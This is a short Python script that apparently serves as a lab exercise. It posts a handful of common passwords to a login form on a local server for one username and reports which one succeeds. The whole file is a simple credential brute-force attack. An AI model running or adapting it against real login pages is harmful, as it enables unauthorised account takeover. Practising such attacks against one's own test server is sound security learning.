import requests

url = "http://127.0.0.1:5000/"
username = "muhammad"

# Sample password list
passwords = ["123456", "password", "admin", "mypassword123", "letmein"]

for password in passwords:
    response = requests.post(url, data={
        "username": username,
        "password": password
    })

    if "Logged in successfully" in response.text:
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Tried: {password}")
